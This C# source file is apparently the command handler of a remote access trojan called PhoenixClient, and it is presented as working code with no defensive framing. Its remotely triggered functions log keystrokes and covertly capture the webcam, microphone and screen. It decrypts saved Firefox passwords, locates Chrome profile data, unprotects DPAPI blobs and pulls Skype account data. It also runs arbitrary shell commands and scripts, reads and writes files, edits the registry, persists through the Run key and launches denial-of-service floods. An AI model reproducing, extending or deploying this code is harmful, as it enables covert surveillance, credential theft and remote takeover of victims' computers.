using Microsoft.Win32;
using PhoenixClient.Work.ClientOperations.Backend;
using PhoenixLib.Datastore.Audio;
using PhoenixLib.Datastore.CommunicationClasses;
using PhoenixLib.Datastore.DataHarvest;
using PhoenixLib.Datastore.SendInput;
using PhoenixLib.Scripting;
using PhoenixLib.TCPLayer;
using PhoenixLib.Webcam;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Speech.Synthesis;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace PhoenixClient.Work.ClientOperations
{
    public static class SystemInfo
    {
        [Command("systemSpecifications", ActionType.RequestData)]
        public static byte[] getSystemSpecifications(Command command)
        {
            CPUInfo[] cpuInfo = WMI.buildWMIObjects<CPUInfo>("Win32_Processor");
            GPUInfo[] gpuInfo = WMI.buildWMIObjects<GPUInfo>("Win32_VideoController");
            RAMInfo[] ramInfo = WMI.buildWMIObjects<RAMInfo>("Win32_PhysicalMemory");
            BIOSInfo[] biosInfo = WMI.buildWMIObjects<BIOSInfo>("Win32_BIOS");
            NetworkAdapterInfo[] networkAdapterInfo = WMI.buildWMIObjects<NetworkAdapterInfo>("Win32_NetworkAdapter");
            PhoenixLib.Datastore.CommunicationClasses.DriveInfo[] driveInfo = WMI.buildWMIObjects<PhoenixLib.Datastore.CommunicationClasses.DriveInfo>("Win32_DiskDrive");
            ScreenInfo[] screenInfo = Screen.AllScreens.Select((x) =>
            {
                return new ScreenInfo
                {
                    deviceName = x.DeviceName,
                    height = x.Bounds.Height,
                    width = x.Bounds.Width
                };
            }).ToArray();
            SoundInfo[] soundInfo = WMI.buildWMIObjects<SoundInfo>("Win32_SoundDevice");
            UserAccountInfo[] userAccountInfo = WMI.buildWMIObjects<UserAccountInfo>("Win32_UserAccount");
            OperatingSystemInfo[] operationSystemInfo = WMI.buildWMIObjects<OperatingSystemInfo>("Win32_OperatingSystem");

            ManagementObjectCollection batteryCollection = WMI.getWMIInfo("Win32_Battery");
            bool batteryInstalled = false;
            foreach (ManagementObject obj in batteryCollection)
            {
                try
                {
                    uint value = (uint)obj["Availability"];
                    if (!((value == 0xB) || (value == 0x6) || (value == 0x1)))
                    {
                        batteryInstalled = false;
                        break;
                    }
                    else
                    {
                        batteryInstalled = true;
                        break;
                    }
                }
                catch
                {
                    batteryInstalled = true;
                    break;
                }
            }
            String internalIP = "0.0.0.0";
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                try
                {
                    socket.Connect("10.0.2.4", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    internalIP = endPoint.Address.ToString();
                }
                catch
                {
                    internalIP = "No internet connection!";
                }
            }
            SoftwareInfo softwareInfo = new SoftwareInfo
            {
                users = userAccountInfo,
                operationSystemInfo = operationSystemInfo[0]
            };
            SummaryInfo hardwareInfo = new SummaryInfo
            {
                cpuInfo = cpuInfo,
                gpuInfo = gpuInfo,
                ramInfo = ramInfo,
                biosInfo = biosInfo,
                networkAdapterInfo = networkAdapterInfo,
                driveInfo = driveInfo,
                monitorInfo = screenInfo,
                internalIP = internalIP,
                soundInfo = soundInfo,
                softwareInfo = softwareInfo,
                batteryAvailible = batteryInstalled
            };
            byte[] data = Util.Serialization.serialize(hardwareInfo);
            return data;
        }
        [Command("currentProcesses", ActionType.RequestData)]
        public static byte[] getCurrentProcesses(Command command)
        {
            List<ProcessInfo> processes = new List<ProcessInfo>();
            foreach (Process process in Process.GetProcesses())
            {
                processes.Add(new ProcessInfo
                {
                    name = process.ProcessName,
                    id = process.Id,
                    activeWindow = process.MainWindowTitle,
                    responding = process.Responding,
                    memoryUsed = process.WorkingSet64 + ""
                });
            }
            return Util.Serialization.serialize(processes);
        }

        [Command("activeWindow", ActionType.RequestData)]
        public static byte[] getActiveWindowTitle(Command command)
        {
            return Util.Conversion.stringToBytes(PInvokeData.CurrentWindowTitle());
        }

        [Command("keystrokes", ActionType.RequestData)]
        public static byte[] getKeystrokes(Command command)
        {
            return Util.Serialization.serialize(Keylogger.parseSessions());
        }

        [Command("findReferenceFilesInUser", ActionType.RequestData)]
        public static byte[] findReferenceFiles(Command command)
        {
            List<Object> relevantEntries = new List<Object>();
            string path = FileSystemOperations.getUserAccountDirectory();
            Regex regex = new Regex(Util.Conversion.bytesToString(command.data), RegexOptions.Compiled);
            List<Object> objects = new List<Object>();
            return Util.Serialization.serialize(FileSystemOperations.findMatches(ref objects, path, regex, true, true, int.MaxValue, 0));
        }

        [Command("writeFile", ActionType.SendData)]
        public static byte[] writeFile(Command command)
        {
            FileTransferInfo tuple = (FileTransferInfo)Util.Serialization.deserialize(command.data);
            String response = String.Empty;
            try
            {
                File.WriteAllBytes(tuple.stringData, tuple.data);
            }
            catch (Exception e)
            {
                response = e.Message;
            }
            return Util.Conversion.stringToBytes(response);
        }

        [Command("findPwdDir", ActionType.RequestData)]
        public static byte[] findPwnDir(Command command)
        {
            String local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            String path = Path.Combine(local, "Google", "Chrome", "User Data", "Default");
            if (Directory.Exists(path))
            {
                return Util.Conversion.stringToBytes(path);
            }
            else
            {
                return Util.Conversion.stringToBytes("null");
            }
        }

        [Command("readFile", ActionType.RequestData)]
        public static byte[] readFile(Command command)
        {
            String path = Util.Conversion.bytesToString(command.data);
            String responseString = path;
            byte[] response;
            try
            {
                response = File.ReadAllBytes(path);
            }
            catch (Exception e)
            {
                response = null;
                responseString = e.Message;
            }
            return Util.Serialization.serialize(new FileTransferInfo
            {
                data = response,
                stringData = responseString
            });
        }

        [Command("getDrives", ActionType.RequestData)]
        public static byte[] getDrives(Command command)
        {
            System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();
            return Util.Serialization.serialize(drives);
        }

        [Command("getDirectory", ActionType.RequestData)]
        public static byte[] getDirectoryInfo(Command command)
        {
            DirectoryInfo parent = new DirectoryInfo(Util.Conversion.bytesToString(command.data));
            List<Object> children = FileSystemOperations.getFileSystemEntries(Util.Conversion.bytesToString(command.data));
            DirectoryRequest request = new DirectoryRequest
            {
                parent = parent,
                children = children
            };
            return Util.Serialization.serialize(request);
        }

        [Command("decryptBytes", ActionType.RequestData)]
        public static byte[] decryptBytes(Command command)
        {
            List<byte[]> bytes = (List<byte[]>)Util.Serialization.deserialize(command.data);
            for (int i = 0; i < bytes.Count; i++)
            {
                byte[] data = bytes[i];
                bytes[i] = ProtectedData.Unprotect(data, null, DataProtectionScope.LocalMachine);
            }
            return Util.Serialization.serialize(bytes);
        }

        [Command("decryptBytesDitto", ActionType.RequestData)]
        public static byte[] decryptBytesDitto(Command command)
        {
            List<byte[]> bytes = (List<byte[]>)Util.Serialization.deserialize(command.data);
            for (int i = 0; i < bytes.Count; i++)
            {
                byte[] data = bytes[i];
                bytes[i] = ProtectedData.Unprotect(data, null, DataProtectionScope.LocalMachine);
            }
            return Util.Serialization.serialize(bytes);
        }

        [Command("copyAndReadFile", ActionType.RequestData)]
        public static byte[] copyAndReadFile(Command command)
        {
            String path = Util.Conversion.bytesToString(command.data);
            File.Copy(path, path + "-copy");
            byte[] data = File.ReadAllBytes(path + "-copy");
            File.Delete(path + "-copy");
            return Util.Serialization.serialize(new FileTransferInfo
            {
                data = data,
                stringData = path
            });
        }

        [Command("copyAndReadFileDitto", ActionType.RequestData)] //wow
        public static byte[] copyAndReadFileDitto(Command command)
        {
            String path = Util.Conversion.bytesToString(command.data);
            File.Copy(path, path + "-copy");
            byte[] data = File.ReadAllBytes(path + "-copy");
            File.Delete(path + "-copy");
            return Util.Serialization.serialize(new FileTransferInfo
            {
                data = data,
                stringData = path
            });
        }

        [Command("showMessageBox", ActionType.SendData)]
        public static byte[] showMessageBox(Command command)
        {
            MessageBoxInfo info = (MessageBoxInfo)Util.Serialization.deserialize(command.data);
            MessageBox.Show(new Form() { TopMost = true }, info.message, info.title, info.buttons, info.icon);
            return new byte[] { };
        }

        [Command("runCMDCommand", ActionType.SendData)]
        public static byte[] runCMDCommand(Command command)
        {
            return Util.Conversion.stringToBytes(CMD.executeCommand(Util.Conversion.bytesToString(command.data)));
        }

        [Command("getWebcamInformation", ActionType.RequestData)]
        public static byte[] getWebcamInfo(Command command)
        {
            return Util.Serialization.serialize(Webcam.getDevices());
        }

        [Command("startWebcam", ActionType.SendData)]
        public static byte[] startWebcam(Command command)
        {
            Webcam.init(Util.Conversion.bytesToString(command.data));
            Webcam.start();
            return new byte[] { };
        }

        [Command("stopWebcam", ActionType.SendData)]
        public static byte[] stopWebcam(Command command)
        {
            Webcam.stop();
            return new byte[] { };
        }

        [Command("getImage", ActionType.RequestData)]
        public static byte[] getSnapshot(Command command)
        {
            byte[] returnData;
            CameraRequest request = (CameraRequest)Util.Serialization.deserialize(command.data);
            if (Webcam.mostRecent == null)
            {
                return new byte[] { };
            }
            using (MemoryStream mem = new MemoryStream())
            {
                using (Bitmap target = (Bitmap)Webcam.mostRecent.Clone())
                {
                    EncoderParameters ep = new EncoderParameters();
                    ep.Param[0] = new EncoderParameter(Encoder.Quality, (long)request.compressLevel);
                    target.Save(mem, getEncoderInfo("image/jpeg"), ep);
                    returnData = mem.ToArray();
                }
            }
            return returnData;
        }

        private static ImageCodecInfo getEncoderInfo(String mimeType)
        {
            int j;
            ImageCodecInfo[] encoders;
            encoders = ImageCodecInfo.GetImageEncoders();
            for (j = 0; j < encoders.Length; ++j)
            {
                if (encoders[j].MimeType == mimeType)
                    return encoders[j];
            }
            return null;
        }

        [Command("setWallpaper", ActionType.SendData)]
        public static byte[] setWallpaper(Command command)
        {
            try
            {
                Wallpaper.set(command.data);
            }
            catch
            {

            }
            return new byte[] { };
        }

        [Command("killSwitch", ActionType.SendData)]
        public static byte[] killswitch(Command command)
        {
            closeStartup(null);
            Process.GetCurrentProcess().Kill();
            return new byte[] { };
        }

        [Command("restart", ActionType.SendData)]
        public static byte[] restart(Command command)
        {
            Program.restart();
            return new byte[] { };
        }
        [Command("openStartup", ActionType.SendData)]
        public static byte[] openStartup(Command command)
        {
            String assembly = Application.ExecutablePath.Replace("/", "\\");
            Object obj = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "placeholder", 0);
            if (obj == null)
                return new byte[] { };
            if (obj.Equals(0))
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", Program.executable, assembly);
            }
            return new byte[] { };
        }

        [Command("closeStartup", ActionType.SendData)]
        public static byte[] closeStartup(Command command)
        {
            Object obj = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "placeholder", 0);
            if (obj == null)
                return new byte[] { };
            if (obj.Equals(0))
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", Program.executable, "");
            }
            return new byte[] { };
        }

        [Command("stopProg", ActionType.SendData)]
        public static byte[] stop(Command command)
        {
            Process.GetCurrentProcess().Kill();
            return new byte[] { };
        }
        [Command("getSkypeInfo", ActionType.RequestData)]
        public static byte[] getSkypeInfo(Command command)
        {
            SkypeResponse response = Skype.getAccountData();
            if (response == null)
                return new byte[] { };
            return Util.Serialization.serialize(response);
        }

        [Command("getIdleTime", ActionType.RequestData)]
        public static byte[] idleTime(Command command)
        {
            TimeSpan time = TimeSpan.FromMilliseconds(IdleTimeFinder.GetIdleTime());
            return Util.Serialization.serialize(time);
        }

        [Command("runScript", ActionType.SendData)]
        public static byte[] runScript(Command command)
        {
            ScriptRequest request = (ScriptRequest)Util.Serialization.deserialize(command.data);
            return Util.Conversion.stringToBytes(ScriptHub.executeScript(request.index, request.code));
        }

        [Command("accessFirefoxPasswords", ActionType.RequestData)]
        public static byte[] accessFirefoxData(Command command)
        {
            try
            {
                String appDataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                if (Directory.Exists(appDataRoaming))
                {
                    String built = Path.Combine(appDataRoaming, "Mozilla", "Firefox", "Profiles");
                    if (Directory.Exists(built))
                    {

                        DirectoryInfo[] profiles = new DirectoryInfo(built).GetDirectories();
                        foreach (DirectoryInfo directory in profiles)
                        {
                            if (directory.GetFiles().Select((x) => (x.Name)).Contains("logins.json"))
                            {
                                DirectoryInfo installPath = new DirectoryInfo(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Program Files (x86)", "Mozilla Firefox"));
                                Mozzarella.InitializeDelegates(directory, installPath);
                                String full = Path.Combine(directory.FullName, "logins.json");
                                String data = File.ReadAllText(full);
                                FirefoxLoginData loginData = Util.Serialization.deserializeJson<FirefoxLoginData>(data);
                                foreach (FirefoxLoginEntry entry in loginData.logins)
                                {
                                    entry.encryptedUsername = Mozzarella.decrypt(entry.encryptedUsername);
                                    entry.encryptedPassword = Mozzarella.decrypt(entry.encryptedPassword);
                                }
                                return Util.Serialization.serialize(loginData.logins);
                            }
                        }
                    }
                }
            }
            catch
            {
                return new byte[] { };
            }
            return new byte[] { };
        }

        [Command("startDOS", ActionType.SendData)]
        public static byte[] startDOS(Command command)
        {
            DOS.running = true;
            DOSRequest request = (DOSRequest)Util.Serialization.deserialize(command.data);
            DOS.cooldown = request.cooldown;
            for (int i = 0; i < request.threadCount; i++)
            {
                DOS.startNewThread(request.host);
            }
            return new byte[] { };
        }

        [Command("stopDOS", ActionType.SendData)]
        public static byte[] stopDOS(Command command)
        {
            DOS.running = false;
            Thread.Sleep(1000);
            DOS.forceKill();
            return new byte[] { };
        }

        [Command("makeDirectory", ActionType.SendData)]
        public static byte[] mkDir(Command command)
        {
            String path = Util.Conversion.bytesToString(command.data);
            Directory.CreateDirectory(path);
            return new byte[] { };
        }

        [Command("getRegistry", ActionType.RequestData)]
        public static byte[] getRegistrySubkeys(Command command)
        {
            RegistryRequest request = (RegistryRequest)Util.Serialization.deserialize(command.data);
            byte[] data;
            if (request.buildHive && request.hive != null)
            {
                RegistryIndex.index((RegistryHive)request.hive, RegistryView.Default);
                data = Util.Serialization.serialize(new RegistryResponse
                {
                    error = String.Empty,
                    isDictionary = false,
                    keyData = RegistryIndex.data[(RegistryHive)request.hive],
                    hive = (RegistryHive)request.hive
                });
            }
            else if (request.hive == null)
            {
                data = Util.Serialization.serialize(new RegistryResponse
                {
                    error = String.Empty,
                    isDictionary = true,
                    dictionary = RegistryIndex.data
                });
            }
            else
            {
                data = Util.Serialization.serialize(new RegistryResponse
                {
                    error = String.Empty,
                    isDictionary = false,
                    keyData = RegistryIndex.data[(RegistryHive)request.hive],
                    hive = (RegistryHive)request.hive
                });
            }
            return data;
        }
        [Command("addRegistryEntry", ActionType.SendData)]
        public static byte[] addRegistryEntry(Command command)
        {
            return RegistryIndex.processModificationRequest(command);
        }
        [Command("updateRegistryEntry", ActionType.SendData)]
        public static byte[] updateRegistryEntry(Command command)
        {
            return RegistryIndex.processModificationRequest(command);
        }

        [Command("httpRequest", ActionType.RequestData)]
        public static byte[] httpRequest(Command command)
        {
            HttpRequest request = (HttpRequest)Util.Serialization.deserialize(command.data);
            return new byte[] { };
        }

        [Command("killProcess", ActionType.SendData)]
        public static byte[] killProcess(Command command)
        {
            Process[] processes = Process.GetProcesses();
            int processId = int.Parse(Util.Conversion.bytesToString(command.data));
            foreach (Process process in processes)
            {
                if (process.Id == processId)
                {
                    try
                    {
                        process.Kill();
                        return Util.Conversion.stringToBytes(String.Empty);
                    }
                    catch (Exception e)
                    {
                        return Util.Conversion.stringToBytes(e.Message);
                    }
                }
            }
            return Util.Conversion.stringToBytes("No such process!");
        }

        [Command("killProcessStr", ActionType.SendData)]
        public static byte[] killProcessStr(Command command)
        {
            Process[] processes = Process.GetProcesses();
            String processName = Util.Conversion.bytesToString(command.data);
            foreach (Process process in processes)
            {
                if (process.ProcessName.Equals(processName))
                {
                    try
                    {
                        process.Kill();
                        return Util.Conversion.stringToBytes(String.Empty);
                    }
                    catch (Exception e)
                    {
                        return Util.Conversion.stringToBytes(e.Message);
                    }
                }
            }
            return Util.Conversion.stringToBytes("No such process!");
        }

        [Command("startRecording", ActionType.SendData)]
        public static byte[] startRecording(Command command)
        {
            AudioRequest request = (AudioRequest)Util.Serialization.deserialize(command.data);
            Microphone.startRecording(request.rate, request.bits, request.channels);
            Microphone.dataBacking = new byte[0] { };
            new Thread(() =>
            {
                Thread.Sleep(30000); //avoid memory waste
                if (Microphone.dataBacking.Length > 1024 * 8 * 8)
                {
                    stopRecording(null);
                }
            }).Start();
            return new byte[] { };
        }
        [Command("stopRecording", ActionType.SendData)]
        public static byte[] stopRecording(Command command)
        {
            Microphone.stopRecording();
            Microphone.dataBacking = new byte[0] { };
            return new byte[] { };
        }

        [Command("getAudioData", ActionType.RequestData)]
        public static byte[] getAudioBuffer(Command command)
        {
            byte[] data = Microphone.dataBacking;
            Microphone.dataBacking = new byte[0];
            return data;
        }

        [Command("sendAudioData", ActionType.SendData)]
        public static byte[] playAudioBuffer(Command command)
        {
            AudioRequest request = (AudioRequest)Util.Serialization.deserialize(command.data);
            Playback.playbackData.Enqueue(request.data); //TODO
            Playback.init(request.rate, request.bits, request.channels);
            Playback.playback();
            return new byte[] { };
        }

        [Command("getScreen", ActionType.RequestData)]
        public static byte[] getScreen(Command command)
        {
            ScreenRequest request = (ScreenRequest)Util.Serialization.deserialize(command.data);
            int check = Screen.AllScreens.Length;
            if (request.indexOfMonitor <= 0 || request.indexOfMonitor >= check)
            {
                return ScreenCapture.captureScreen(Screen.AllScreens[0], request.compressLevel); //default
            }
            return ScreenCapture.captureScreen(Screen.AllScreens[request.indexOfMonitor], request.compressLevel);
        }

        [Command("mouseAction", ActionType.SendData)]
        public static byte[] manipulateMouse(Command command)
        {
            MouseRequest request = (MouseRequest)Util.Serialization.deserialize(command.data);
            Screen screen = Screen.AllScreens[request.monitorIndex];
            SendInputWrapper wrapper = new SendInputWrapper();
            double x = (lerp(0, screen.Bounds.Width - 1, request.x / request.ax));
            double y = (lerp(0, screen.Bounds.Height - 1, request.y / request.ay));
            wrapper.sim_mov((int)(((screen.Bounds.X + x) / 2.0)), (int)(((screen.Bounds.Y + y) / 2.0)));
            if (request.isClick)
            {
                if (request.isRightClick)
                {
                    wrapper.sim_right_click();
                }
                else
                {
                    wrapper.sim_left_click();
                }
            }
            return new byte[] { };
        }

        [Command("pressKeyboardKey", ActionType.SendData)]
        public static byte[] pressKey(Command command)
        {
            Keylogger.safeAdd(((KeypressRequest)Util.Serialization.deserialize(command.data)).key);
            return new byte[] { };
        }

        private static double lerp(double x, double y, double alpha)
        {
            return ((x + (y - x)) * alpha);
        }

        [Command("getVoices", ActionType.RequestData)]
        public static byte[] getVoices(Command command)
        {
            return Util.Serialization.serialize(new SpeechSynthesizer().GetInstalledVoices().Select((x) => (x.VoiceInfo.Name)).ToArray());
        }

        [Command("speakText", ActionType.SendData)]
        public static byte[] speakText(Command command)
        {
            SpeechRequest request = (SpeechRequest)Util.Serialization.deserialize(command.data);
            SpeechSynthesizer synth = new SpeechSynthesizer();
            synth.SelectVoice(request.name);
            synth.Volume = request.volume;
            synth.SpeakAsync(request.text);
            return new byte[] { };
        }
    }
}

